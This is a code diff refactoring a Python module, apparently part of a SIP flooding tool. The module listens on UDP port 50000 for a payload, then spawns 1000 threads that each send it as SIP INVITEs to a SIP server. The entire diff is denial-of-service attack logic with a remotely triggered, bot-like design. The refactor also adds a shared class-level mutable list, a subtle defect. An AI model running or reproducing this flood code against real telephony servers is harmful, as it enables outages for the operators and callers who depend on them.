@@ -5,11 +5,14 @@ import sendInvite
 import time
 
 
-class flood_module:
+class FloodModule:
+    s = None
+    data = []
+    running = None
+
     def __init__(self):
-        running = False
-        s = sendInvite.SendInvite
-        data = []
+        self.running = False
+        self.s = sendInvite.SendInvite
 
     def fire_thread(self, payload):
         """Call sendInvite to fire payload to the SIP server"""
@@ -25,9 +28,9 @@ class flood_module:
         sock.bind(("0.0.0.0", 50000))
 
         buffersize = 1024
-        while not data:
-            data = sock.recvfrom(buffersize)
-        decoded = data[0].decode()
+        while not self.data:
+            self.data = sock.recvfrom(buffersize)
+        decoded = self.data[0].decode()
         threads = []
         for i in range(0, 1000):
             t = threading.Thread(target=self.fire_thread, args=(decoded,))
